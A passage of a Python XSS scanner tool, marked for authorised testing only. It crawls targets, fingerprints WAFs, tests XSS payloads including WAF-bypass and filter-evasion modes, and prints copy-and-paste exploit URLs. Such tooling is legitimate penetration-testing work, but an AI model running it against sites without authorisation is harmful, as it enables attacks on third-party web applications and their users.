                    # In URL context (href="..."), "javascript:" is dangerous
                    if 'javascript:' in payload_lower:
                        is_dangerous = True
                        
                elif current_context_type == 'html_body':
                    # In HTML body, we NEED tags (<script, <img, etc.) for it to be XSS
                    # Just reflecting "alert(1)" or "%3Cscript..." is NOT XSS
                    if has_tags:
                        # Must look like a tag: <[a-z]
                        if re.search(r'<[a-z/!?]', matched_payload, re.I):
                             is_dangerous = True
                             
                elif current_context_type == 'html_attribute':
                    # In normal attribute (value="..."), we need to break out
                    # Payload must have quotes to break out
                    if has_quotes or '>' in matched_payload:
                        is_dangerous = True
                
                elif current_context_type == 'html_comment':
                     # Never dangerous in comments unless breaking out (which changes context)
                     is_dangerous = False

                if is_dangerous:
                    # Valid dangerous reflection found!
                    # ADDITIONAL SAFETY CHECK: Check for safe tags (textarea, title, etc.)
                    if self._is_safe_context(response_text, idx, matched_payload):
                        # It's in a safe context (like <title>...</title>), treating as not vulnerable
                        pass
                    else:
                        return True
                
                search_start = idx + len(matched_payload)  # Skip past current match
        
        return False
    
    def _is_safe_context(self, html, match_index, payload):
        """Check if the payload is in a safe context (e.g. textarea, title, safe attribute)"""
        # Look backwards from match_index to find the opening tag
        # Limit search window for performance
        search_window = 500
        start_search = max(0, match_index - search_window)
        preceding_text = html[start_search:match_index].lower()
        
        # 1. Check for Safe Tags where scripts don't execute
        safe_tags = ['<textarea', '<title', '<style', '<noscript', '<noembed', '<template', '<pre', '<code']
        
        # Find the last opening tag
        last_tag_idx = -1
        last_tag_name = ""
        
        for tag in safe_tags:
            tag_idx = preceding_text.rfind(tag)
            if tag_idx > last_tag_idx:
                last_tag_idx = tag_idx
                last_tag_name = tag
        
        # If we found a safe tag opening
        if last_tag_idx != -1:
            # Check if it was closed before the payload
            # Extract the tag name properly (e.g. <textarea)
            tag_pure_name = last_tag_name[1:] # remove <
            closing_tag = f"</{tag_pure_name}>"
            
            # Check if there is a closing tag BETWEEN the opening safe tag and the payload
            # Note: last_tag_idx is relative to preceding_text start
            
            # Text between safe tag open and payload
            interim_text = preceding_text[last_tag_idx:]
            
            if closing_tag not in interim_text:
                # We are INSIDE a safe tag!
                # UNLESS the payload itself closes it (breakout)
                # If payload contains </textarea> or </title> etc, it might be a breakout
                if f"</{tag_pure_name}>" in payload.lower():
                    return False # Breakout attempts are DANGEROUS, so NOT safe context
                
                return True # Trapped inside safe tag without breakout = Safe
        
        # 2. Check for Attribute Context (Safe vs Dangerous)
        # If we are inside an HTML attribute
        # Simplified check: look for <tag ... attribute="[PAYLOAD IS HERE]"
        
        # Find start of current tag (look for last <)
        last_bracket = preceding_text.rfind('<')
        last_close_bracket = preceding_text.rfind('>')
        
        if last_bracket > last_close_bracket:
            # We are likely inside a tag definition
            tag_def = preceding_text[last_bracket:]
            
            # Check if we are inside an attribute value
            # Count quotes to see if we are inside one
            # This is heuristic and imperfect but filter obvious false positives
            
            if '="' in tag_def or "='" in tag_def:
                # We are in an attribute. Check if we broke out.
                # If payload starts with " or ' or > it attempts to break out.
                
                # If the payload is just a standard tag injection like <script>...
                # And it didn't break out of the quote...
                
                # Check what quote was used
                last_double = tag_def.rfind('"')
                last_single = tag_def.rfind("'")
                
                quote_char = None
                if last_double > last_single and last_double != -1:
                    quote_char = '"'
                elif last_single > last_double and last_single != -1:
                    quote_char = "'"
                
                if quote_char:
                    # We are likely in a quoted attribute
                    # Does payload break it?
                    if quote_char not in payload and '>' not in payload:
                        # Payload does not break out of attribute, and is not breaking the tag
                        # Check if attribute name is dangerous (on*, href, srcdoc)
                        # Find attribute name before the quote
                        attr_part = tag_def[:tag_def.rfind(quote_char)]
                        # e.g. <a href=
                        
                        is_dangerous_attr = False
                        for dang in ['on', 'href', 'src', 'action', 'data']:
                            if attr_part.strip().endswith(dang + '='):
                                is_dangerous_attr = True
                        
                        if not is_dangerous_attr:
                            # Inside safe attribute (e.g. value="<script>...") and didn't break out
                            return True
        
        # 3. Check for JavaScript String Context
        # <script>var x = "[PAYLOAD]";</script>
        # If we correspond to [PAYLOAD], checks if we are in string
        
        if '<script' in preceding_text and '</script>' not in preceding_text[preceding_text.rfind('<script'):]:
             # Inside JS
             # Check if inside string
             # Simple heuristic: count quotes in the closest JS context
             # This is hard to do reliably with regex/simple parsing, omitting for now to avoid false negatives.
             pass

        return False
    
    def print_results(self):
        """Print scan results summary"""
        total_params = sum(len(p['get']) + len(p['post']) for p in self.found_params.values())
        payloads = self.get_payloads()
        total_tests = total_params * len(payloads)
        
        # Count DOM sinks if available
        dom_sinks_count = len(getattr(self, 'dom_sinks_found', []))
        
        print(f"\n{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.CYAN}|{' '*22}📊 SCAN RESULTS SUMMARY{' '*22}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}Target:              {Fore.CYAN}{self.target[:45]:<45}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}Pages Crawled:       {Fore.YELLOW}{len(self.visited):<46}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}Endpoints Found:     {Fore.YELLOW}{len(self.found_params):<46}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}Parameters Found:    {Fore.YELLOW}{total_params:<46}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}| {Fore.WHITE}Total Tests Run:     {Fore.YELLOW}{total_tests:<46}|{Style.RESET_ALL}")
        
        # Show DOM sinks if found
        if dom_sinks_count > 0:
            print(f"{Fore.CYAN}| {Fore.WHITE}DOM XSS Sinks:       {Fore.RED}{dom_sinks_count:<46}|{Style.RESET_ALL}")
        
        vulns_color = Fore.RED if self.vulnerabilities else Fore.GREEN
        vuln_status = f"{len(self.vulnerabilities)} {'⚠️  VULNERABLE!' if self.vulnerabilities else '✓ SECURE'}"
        print(f"{Fore.CYAN}| {Fore.WHITE}Vulnerabilities:     {vulns_color}{vuln_status:<46}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        
        # Print DOM XSS findings
        if dom_sinks_count > 0:
            print(f"\n{Fore.YELLOW}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}|{' '*16}⚠️  POTENTIAL DOM XSS DETECTED ⚠️{' '*16}|{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}+{'-'*68}+{Style.RESET_ALL}\n")
            
            for i, sink in enumerate(self.dom_sinks_found[:5], 1):
                severity_color = Fore.RED if sink['severity'] == 'critical' else (Fore.YELLOW if sink['severity'] == 'high' else Fore.CYAN)
                print(f"{Fore.YELLOW}[{i}] {severity_color}{sink['sink']} ({sink['severity']}){Style.RESET_ALL}")
                print(f"    {Fore.WHITE}Source: {Fore.CYAN}{sink['source']}{Style.RESET_ALL}")
                if 'url' in sink:
                    print(f"    {Fore.WHITE}URL: {Fore.BLUE}{sink['url']}{Style.RESET_ALL}")
                print()
            
            if dom_sinks_count > 5:
                print(f"{Fore.BLUE}... and {dom_sinks_count - 5} more potential DOM XSS sinks{Style.RESET_ALL}\n")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.RED}|{' '*18}🚨 VULNERABILITIES DETECTED 🚨{' '*18}|{Style.RESET_ALL}")
            print(f"{Fore.RED}+{'-'*68}+{Style.RESET_ALL}\n")
            
            # Group by URL and param for cleaner output
            vuln_by_url = {}
            for vuln in self.vulnerabilities:
                key = f"{vuln['url']}|{vuln['param']}|{vuln['method']}"
                if key not in vuln_by_url:
                    vuln_by_url[key] = {
                        'url': vuln['url'],
                        'param': vuln['param'],
                        'method': vuln['method'],
                        'payloads': [],
                        'encoded_url': vuln.get('encoded_url', '')
                    }
                vuln_by_url[key]['payloads'].append(vuln['payload'])
            
            for i, (key, v) in enumerate(vuln_by_url.items(), 1):
                print(f"{Fore.RED}[{i}] {Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
                print(f"    {Fore.WHITE}URL:       {Fore.CYAN}{v['url']}{Style.RESET_ALL}")
                print(f"    {Fore.WHITE}Parameter: {Fore.GREEN}{v['param']}{Style.RESET_ALL}")
                print(f"    {Fore.WHITE}Method:    {Fore.YELLOW}{v['method']}{Style.RESET_ALL}")
                print(f"    {Fore.WHITE}Payloads:  {Fore.MAGENTA}{len(v['payloads'])} working{Style.RESET_ALL}")
                # Show first 3 payloads
                for j, payload in enumerate(v['payloads'][:3]):
                    short_payload = payload[:50] + '...' if len(payload) > 50 else payload
                    print(f"               {Fore.GREEN}• {short_payload}{Style.RESET_ALL}")
                if len(v['payloads']) > 3:
                    print(f"               {Fore.BLUE}... and {len(v['payloads']) - 3} more{Style.RESET_ALL}")
                print()
            
            # Print exploit URLs section
            print(f"{Fore.MAGENTA}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}|{' '*15}🔗 EXPLOIT URLs (Copy & Paste){' '*21}|{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}+{'-'*68}+{Style.RESET_ALL}\n")
            
            # Show unique exploit URLs
            seen_urls = set()
            url_count = 0
            for vuln in self.vulnerabilities:
                exploit_url = vuln.get('encoded_url', vuln.get('full_url', vuln['url']))
                if exploit_url not in seen_urls:
                    seen_urls.add(exploit_url)
                    url_count += 1
                    print(f"{Fore.GREEN}[{url_count}]{Style.RESET_ALL} {Fore.CYAN}{exploit_url}{Style.RESET_ALL}")
                    if url_count >= 20:  # Limit output
                        remaining = len(set(v.get('encoded_url', v.get('full_url', v['url'])) for v in self.vulnerabilities)) - 20
                        if remaining > 0:
                            print(f"\n{Fore.BLUE}... and {remaining} more unique exploit URLs{Style.RESET_ALL}")
                        break
            
        else:
            print(f"\n{Fore.GREEN}+{'-'*68}+{Style.RESET_ALL}")
            print(f"{Fore.GREEN}|{' '*22}✅ NO VULNERABILITIES{' '*24}|{Style.RESET_ALL}")
            print(f"{Fore.GREEN}+{'-'*68}+{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}💡 Note: No XSS vulnerabilities detected with automatic testing.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}   Manual testing and DOM-based XSS checks are recommended.{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.CYAN}|{' '*24}✨ SCAN COMPLETE ✨{' '*25}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}\n")
    
    def show_payloads(self):
        """Display all available XSS payloads"""
        payloads_to_show = self.get_payloads()
        source = "CUSTOM" if self.custom_payloads else "BUILT-IN"
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}                    {source} XSS PAYLOADS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        # If custom payloads, just list them all
        if self.custom_payloads:
            for i, payload in enumerate(payloads_to_show, 1):
                print(f"{Fore.GREEN}[{i}] {Fore.WHITE}{payload}{Style.RESET_ALL}")
            print(f"\n{Fore.WHITE}Total custom payloads: {Fore.CYAN}{len(payloads_to_show)}{Style.RESET_ALL}\n")
            return
        
        # Categorize built-in payloads
        categories = {
            "Basic Script Injection": [],
            "Event Handler Payloads": [],
            "SVG Payloads": [],
            "Encoded Payloads": [],
            "Case Variation": [],
            "Attribute Breaking": [],
            "JavaScript Context Breaking": [],
            "Filter Evasion": [],
            "Polyglot Payloads": [],
            "Other": []
        }
        
        for payload in payloads_to_show:
            if '<script>' in payload.lower() and 'onerror' not in payload.lower():
                categories["Basic Script Injection"].append(payload)
            elif any(x in payload.lower() for x in ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', 'ontoggle', 'onbegin', 'onstart']):
                categories["Event Handler Payloads"].append(payload)
            elif '<svg' in payload.lower():
                categories["SVG Payloads"].append(payload)
            elif any(x in payload for x in ['&#', '%3C', '%25', '\\u']):
                categories["Encoded Payloads"].append(payload)
            elif payload != payload.lower() and 'script' in payload.lower():
                categories["Case Variation"].append(payload)
            elif any(x in payload for x in ['"><', "'><", '" onclick', "' onclick"]):
                categories["Attribute Breaking"].append(payload)
            elif any(x in payload for x in ["';alert", '";alert', "</script><script"]):
                categories["JavaScript Context Breaking"].append(payload)
            elif any(x in payload for x in ['<scr<script>', '<<script>', 'scri%00pt']):
                categories["Filter Evasion"].append(payload)
            elif len(payload) > 100:
                categories["Polyglot Payloads"].append(payload)
            else:
                categories["Other"].append(payload)
        
        for category, cat_payloads in categories.items():
            if cat_payloads:
                print(f"{Fore.YELLOW}▶ {category}:{Style.RESET_ALL}")
                for payload in cat_payloads[:5]:  # Show first 5
                    print(f"   {Fore.GREEN}{payload}{Style.RESET_ALL}")
                if len(cat_payloads) > 5:
                    print(f"   {Fore.BLUE}... and {len(cat_payloads) - 5} more{Style.RESET_ALL}")
                print()
        
        print(f"{Fore.WHITE}Total payloads: {Fore.CYAN}{len(payloads_to_show)}{Style.RESET_ALL}\n")
    
    def run(self):
        """Run the full scan"""
        self.print_banner()
        
        print(f"{Fore.CYAN}[*] Step 1/5: Initializing scan components...{Style.RESET_ALL}")
        # Initialize DOM sinks storage
        self.dom_sinks_found = []
        
        print(f"{Fore.CYAN}[*] Step 2/5: Detecting WAF protection...{Style.RESET_ALL}")
        # Detect WAF protection
        self.detect_waf()
        
        print(f"{Fore.CYAN}[*] Step 3/5: Crawling target for endpoints...{Style.RESET_ALL}")
        self.crawl()
        
        print(f"{Fore.CYAN}[*] Step 4/5: Analyzing for DOM-based XSS sinks...{Style.RESET_ALL}")
        # Perform DOM XSS sink analysis
        self._analyze_dom_sinks()
        
        print(f"{Fore.CYAN}[*] Step 5/5: Executing XSS payload tests...{Style.RESET_ALL}")
        self.test_xss()
        
        self.print_results()
    
    def _analyze_dom_sinks(self):
        """Analyze all visited pages for DOM XSS sinks - ADVANCED"""
        from bs4 import BeautifulSoup
        print(f"\n{Fore.CYAN}[*] Analyzing for DOM-based XSS sinks...{Style.RESET_ALL}")
    
        dom_vulns_found_count = 0
        
        for url in list(self.visited)[:10]:  # Analyze up to 10 pages
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                
                # 1. Detect Sinks (Heuristic)
                sinks = self._detect_dom_sinks(response.text)
                for sink in sinks:
                    sink['url'] = url
                    self.dom_sinks_found.append(sink)
                
                # 2. Test for DOM XSS (Exploit Generation)
                try:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    dom_xss_results = self._test_dom_xss(url, soup)
                    
                    for vuln in dom_xss_results:
                        self.vulnerabilities.append(vuln) # Add to main vulnerabilities list
                        dom_vulns_found_count += 1
                        self._print_vuln_report(vuln, dom_vulns_found_count)
                        
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.RED}[!] Error testing DOM XSS on {url}: {e}{Style.RESET_ALL}")
                    
            except:
                continue
        
        if self.dom_sinks_found and dom_vulns_found_count == 0:
            print(f"{Fore.YELLOW}[!] Found {len(self.dom_sinks_found)} potential DOM XSS sinks (no direct exploit generated)!{Style.RESET_ALL}")
            if self.verbose:
                for sink in self.dom_sinks_found[:5]:
                    print(f"    {Fore.RED}• {sink['sink']} ({sink['severity']}) via {sink['source']}{Style.RESET_ALL}")
        elif dom_vulns_found_count == 0:
            print(f"{Fore.GREEN}[+] No DOM XSS sinks detected{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        usage=argparse.SUPPRESS,
        description=rf"""
{Fore.CYAN}{Style.BRIGHT}╔{'═'*69}╗
{Fore.YELLOW}║   ≋★                                                          ★≋    {Fore.CYAN}║
{Fore.GREEN}║   ██╗  ██╗███████╗███████╗    {Fore.WHITE}███████╗ ██████╗ █████╗ ███╗   ██╗    {Fore.CYAN}║
{Fore.GREEN}║   ╚██╗██╔╝██╔════╝██╔════╝    {Fore.WHITE}██╔════╝██╔════╝██╔══██╗████╗  ██║    {Fore.CYAN}║
{Fore.GREEN}║    ╚███╔╝ ███████╗███████╗    {Fore.WHITE}███████╗██║     ███████║██╔██╗ ██║    {Fore.CYAN}║
{Fore.GREEN}║    ██╔██╗ ╚════██║╚════██║    {Fore.WHITE}╚════██║██║     ██╔══██║██║╚██╗██║    {Fore.CYAN}║
{Fore.GREEN}║   ██╔╝ ██╗███████║███████║    {Fore.WHITE}███████║╚██████╗██║  ██║██║ ╚████║    {Fore.CYAN}║
{Fore.GREEN}║   ╚═╝  ╚═╝╚══════╝╚══════╝    {Fore.WHITE}╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    {Fore.CYAN}║
{Fore.YELLOW}║                                                                     ║
{Fore.YELLOW}║   [+] {Fore.WHITE}Advanced XSS Vulnerability Scanner for Linux                  {Fore.CYAN}║
{Fore.YELLOW}║   [+] {Fore.WHITE}Automatic Parameter Discovery & Payload Testing               {Fore.CYAN}║
{Fore.YELLOW}║   [+] {Fore.WHITE}40+ WAF Detection & Response Analysis Capabilities              {Fore.CYAN}║
{Fore.YELLOW}║   [+] {Fore.WHITE}Enhanced Auto-Crawl for PHP MVC Endpoints                     {Fore.CYAN}║
{Fore.YELLOW}║                                                                     ║
{Fore.CYAN}║      <{Fore.MAGENTA}/{Fore.CYAN}> {Fore.WHITE}Code by {Fore.WHITE}Subhajit {Fore.WHITE}- {Fore.GREEN}Security Research {Fore.CYAN}<{Fore.MAGENTA}/{Fore.CYAN}>{Fore.CYAN}                   ║
{Fore.YELLOW}║                                                                     ║
{Fore.YELLOW}║           {Fore.YELLOW}[!] {Fore.RED}For Authorized Security Testing Only{Fore.YELLOW} [!]{Fore.CYAN}              ║
{Fore.YELLOW}║   ≋★                                                          ★≋    {Fore.CYAN}║
{Fore.CYAN}╚{'═'*69}╝{Style.RESET_ALL}
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 xss_scanner.py example.com
  python3 xss_scanner.py https://example.com -d 5 -v
  python3 xss_scanner.py example.com --show-payloads
  python3 xss_scanner.py example.com -p payloads.txt
  python3 xss_scanner.py example.com --waf-bypass
  python3 xss_scanner.py example.com --show-waf-payloads
  python3 xss_scanner.py example.com --auto-crawl     # Enhanced PHP endpoint discovery
  
⚠️  For authorized security testing only!
        """

    )
    
    parser.add_argument(
        'domain',
        nargs='?',
        help='Target domain to scan (e.g., example.com or https://example.com)'
    )
    
    parser.add_argument(
        '-d', '--depth',
        type=int,
        default=3,
        help='Maximum crawl depth (default: 3)'
    )
    
    parser.add_argument(
        '-t', '--timeout',
        type=int,
        default=10,
        help='Request timeout in seconds (default: 10)'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    parser.add_argument(
        '--show-payloads',
        action='store_true',
        help='Show all available XSS payloads and exit'
    )
    
    parser.add_argument(
        '-p', '--payloads',
        type=str,
        metavar='FILE',
        help='Path to custom payload list file (one payload per line)'
    )
    
    parser.add_argument(
        '--all-payloads',
        action='store_true',
        help='Test ALL payloads per parameter (default: stop after first successful)'
    )
    
    parser.add_argument(
        '--waf-bypass',
        action='store_true',
        help='Enable WAF bypass mode with advanced evasion payloads'
    )
    
    parser.add_argument(
        '--show-waf-payloads',
        action='store_true',
        help='Show all WAF bypass payloads and exit'
    )
    
    parser.add_argument(
        '--show-wafs',
        action='store_true',
        help='Show all detectable WAFs (160+) and exit'
    )
    
    parser.add_argument(
        '--no-param-discovery',
        action='store_true',
        help=argparse.SUPPRESS  # Hidden - param discovery enabled by default
    )
    
    parser.add_argument(
        '--brute-params',
        action='store_true',
        default=True,
        help=argparse.SUPPRESS  # Hidden - enabled by default
    )
    
    parser.add_argument(
        '--no-brute-params',
        action='store_true',
        help='Disable brute-forcing of common XSS parameters'
    )
    
    parser.add_argument(
        '--deep-scan',
        action='store_true',
        help='Enable comprehensive testing for Reflected, Stored, DOM, and Blind XSS'
    )
    
    parser.add_argument(
        '--force-test',
        action='store_true',
        default=True,
        help=argparse.SUPPRESS  # Hidden - enabled by default
    )
    
    parser.add_argument(
        '--no-force-test',
        action='store_true',
        help='Disable force testing of common XSS params (enabled by default)'
    )
    
    parser.add_argument(
        '--auto-crawl',
        action='store_true',
        default=True,
        help='Enable enhanced auto-crawl for PHP MVC endpoints (enabled by default)'
    )
    
    parser.add_argument(
        '--no-auto-crawl',
        action='store_true',
        help='Disable enhanced PHP endpoint auto-crawl discovery'
    )

    parser.add_argument(
        '--wayback-limit',
        default=50,
        help='Limit number of Wayback Machine URLs to crawl (default: 50, use "all" for unlimited)'
    )

    parser.add_argument(
        '--find-subdomains',
        action='store_true',
        help='Find subdomains using online sources and local brute force'
    )

    parser.add_argument(
        '--subdomain-wordlist',
        type=str,
        help='Path to custom wordlist for subdomain brute force'
    )
    
    args = parser.parse_args()
    
    # Load custom payloads if provided
    custom_payloads = None
    if args.payloads:
        try:
            with open(args.payloads, 'r', encoding='utf-8') as f:
                custom_payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if not custom_payloads:
                print(f"{Fore.RED}[!] Error: Payload file is empty or contains only comments{Style.RESET_ALL}")
                sys.exit(1)
            print(f"{Fore.GREEN}[+] Loaded {len(custom_payloads)} custom payloads from: {args.payloads}{Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Error: Payload file not found: {args.payloads}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}[!] Error reading payload file: {e}{Style.RESET_ALL}")
            sys.exit(1)
    
    # Show payloads only
    if args.show_payloads:
        scanner = XSSScanner("dummy", custom_payloads=custom_payloads)
        scanner.print_banner()
        scanner.show_payloads()
        sys.exit(0)
    
    # Show WAF bypass payloads if requested
    if args.show_waf_payloads:
        scanner = XSSScanner("dummy", waf_bypass=True)
        scanner.print_banner()
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}                    WAF BYPASS PAYLOADS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        for i, payload in enumerate(scanner.WAF_BYPASS_PAYLOADS, 1):
            print(f"{Fore.GREEN}[{i}] {Fore.WHITE}{payload}{Style.RESET_ALL}")
        print(f"\n{Fore.WHITE}Total WAF bypass payloads: {Fore.CYAN}{len(scanner.WAF_BYPASS_PAYLOADS)}{Style.RESET_ALL}\n")
        sys.exit(0)
    
    # Show all detectable WAFs if requested
    if args.show_wafs:
        scanner = XSSScanner("dummy")
        scanner.print_banner()
        
        # WAF categories for display
        waf_categories = {
            '🔵 360 Technologies': ['360panyun', '360wangzhanbao', '360waf'],
            '☁️ Major Cloud/CDN WAFs': ['cloudflare', 'cloudfloor', 'cloudfront', 'akamai', 'kona_sitedefender', 'aws_waf', 'aws_elb', 'google_cloud_armor', 'azure_waf', 'azure_frontdoor', 'oracle_cloud'],
            '⚡ F5 Networks': ['f5_bigip', 'f5_asm', 'f5_ltm', 'firepass', 'trafficshield'],
            '🏰 Fortinet': ['fortigate', 'fortiweb', 'fortiguard'],
            '🔒 Imperva': ['imperva', 'securesphere'],
            '🍊 Citrix': ['netscaler', 'teros'],
            '🐟 Barracuda': ['barracuda', 'netcontinuum'],
            '📡 Radware': ['radware'],
            '🔥 Palo Alto': ['palo_alto'],
            '🇨🇳 Chinese WAFs': ['alibaba_waf', 'tencent_waf', 'qcloud', 'baidu_waf', 'nsfocus', 'knownsec', 'jiasule', 'yundun', 'anquanbao', 'anyu', 'safedog', 'safeline', 'chuangyushield', 'huawei_waf', 'bluedon', 'west263', 'chinacache', 'cdnns', 'puhui', 'qiniu', 'eisoo', 'xuanwudun', 'yunsuo', 'senginx', 'powercdn'],
            '🌿 Security Vendors': ['sucuri', 'stackpath', 'edgecast', 'fastly', 'keycdn', 'limelight', 'maxcdn', 'beluga', 'cachefly', 'airee'],
            '🛡️ Bot Protection & Anti-DDoS': ['reblaze', 'datadome', 'perimeterx', 'distil', 'kasada', 'ddos_guard', 'dosarrest', 'nullddos', 'blockdos', 'qrator', 'variti', 'threatx'],
            '🏢 Enterprise WAFs': ['checkpoint', 'juniper', 'sonicwall', 'watchguard', 'datapower', 'webseal'],
            '🔧 Open Source WAFs': ['modsecurity', 'naxsi', 'shadow_daemon', 'openresty', 'varnish', 'envoy'],
            '🐺 WordPress/CMS WAFs': ['wordfence', 'bulletproof_security', 'secupress', 'ninjaFirewall', 'cerber_security', 'shield_security', 'malcare', 'webarx', 'wpmudev', 'rsfirewall', 'crawlprotect', 'expression_engine'],
            '🏠 Hosting/Platform WAFs': ['siteground', 'godaddy', 'squarespace', 'wix_waf', 'litespeed', 'imunify360', 'bitninja', 'virusdie'],
            '🌍 Regional WAFs': ['arvancloud'],
            '🔐 Other Security Solutions': ['comodo', 'wallarm', 'armor', 'denyall', 'airlock', 'profense', 'sitelock', 'zenedge', 'alert_logic', 'approach', 'astra', 'barikode', 'baffin_bay', 'bekchy', 'binarysec', 'cloud_protector', 'cloudbric', 'dotdefender', 'dynamicweb', 'greywizard', 'hyperguard', 'indusguard', 'instart', 'janusec', 'kemp', 'link11', 'mission_control', 'nemesida', 'nevisproxy', 'newdefend', 'nexusguard', 'onmessage_shield', 'pt_appfirewall', 'pentawaf', 'raywaf', 'sabre', 'safe3', 'secking', 'secure_entry', 'serverdefender', 'siteguard', 'squidproxy', 'transip', 'uewaf', 'urlmaster', 'urlscan', 'utm', 'webknight', 'webland', 'webtotem', 'xlabs', 'yxlink', 'zscaler', 'aesecure', 'eeye', 'pksecurity', 'shieldon', 'azion', 'isa_server', 'request_validation', 'wts_waf', 'viettel', 'aspa', 'ace_xml', 'asp_net'],
            '⚠️ Generic': ['generic_waf'],
        }
        
        print(f"\n{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}")
        print(f"{Fore.CYAN}|{Fore.WHITE}             🛡️  DETECTABLE WAF SIGNATURES (160+)               {Fore.CYAN}|{Style.RESET_ALL}")
        print(f"{Fore.CYAN}+{'-'*68}+{Style.RESET_ALL}\n")
        
        total_wafs = 0
        for category, wafs in waf_categories.items():
            print(f"\n{Fore.YELLOW}{category}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")
            for waf in wafs:
                if waf in scanner.WAF_SIGNATURES:
                    total_wafs += 1
                    # Get display name from waf_names dict pattern
                    display_name = waf.replace('_', ' ').title()
                    print(f"  {Fore.GREEN}✓{Fore.WHITE} {display_name}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}+{'-'*70}+{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total detectable WAFs: {Fore.GREEN}{total_wafs}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Total bypass payloads: {Fore.GREEN}{len(scanner.WAF_BYPASS_PAYLOADS)}{Style.RESET_ALL}\n")
        sys.exit(0)
    
    # Domain is required for scanning
    if not args.domain:
        parser.print_help()
        print(f"\n{Fore.RED}[!] Error: Domain is required for scanning{Style.RESET_ALL}")
        sys.exit(1)

    # Multi-Target Scanning Logic
    targets_to_scan = []
    
    # Subdomain Discovery
    if args.find_subdomains:
        scanner = SubdomainScanner(args.domain, args.subdomain_wordlist)
        scanner.run()
        if scanner.found_subdomains:
            # Add all found subdomains to the scan list
            targets_to_scan.extend(list(scanner.found_subdomains))
        
        print(f"\n{Fore.CYAN}[*] Continuing to XSS scan on discovered targets...{Style.RESET_ALL}")
    
    # Always add the main target (normalized already inside XSSScanner, but added here for list)
    # Ensure it's not a duplicate if it was found in subdomains
    if args.domain not in targets_to_scan:
        targets_to_scan.insert(0, args.domain)
        
    # Remove duplicates
    targets_to_scan = list_unique(targets_to_scan)
    
    total_targets = len(targets_to_scan)
    print(f"\n{Fore.CYAN}[+] Scheduled {total_targets} target(s) for XSS scanning.{Style.RESET_ALL}")
    
    for i, target in enumerate(targets_to_scan, 1):
        print(f"\n{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}   🚀 SCANNING TARGET [{i}/{total_targets}]: {Fore.WHITE}{target}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*80}{Style.RESET_ALL}\n")
    
        # Create and run scanner for each target
        scanner = XSSScanner(
            target=target,
            max_depth=args.depth,
            timeout=args.timeout,
            verbose=args.verbose,
            custom_payloads=custom_payloads,
            first_only=not args.all_payloads,  # Stop at first match unless --all-payloads
            waf_bypass=args.waf_bypass,  # Enable WAF bypass mode
            param_discovery=not args.no_param_discovery,  # Enable advanced parameter discovery (default: True)
            brute_params=args.brute_params and not args.no_brute_params,  # Enable parameter brute-forcing (default: True)
            force_test=args.force_test and not args.no_force_test,  # Force test common params when none discovered (default: True)
            deep_scan=args.deep_scan,  # Enable deep scanning
            wayback_limit=args.wayback_limit  # Limit for Wayback URLs ('all' or int)
        )
        
        try:
            scanner.run()
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user for target: {target}{Style.RESET_ALL}")
            if scanner.vulnerabilities:
                scanner.print_results()
            
            # Ask if user wants to stop everything or continue to next target
            # For automation, maybe just break? But user might want to skip one.
            # Let's assume full stop on Ctrl+C for safety.
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}[!] Error scanning {target}: {e}{Style.RESET_ALL}")
            continue

def list_unique(seq):
    seen = set()
    return [x for x in seq if not (x in seen or seen.add(x))]



if __name__ == '__main__':
    main()
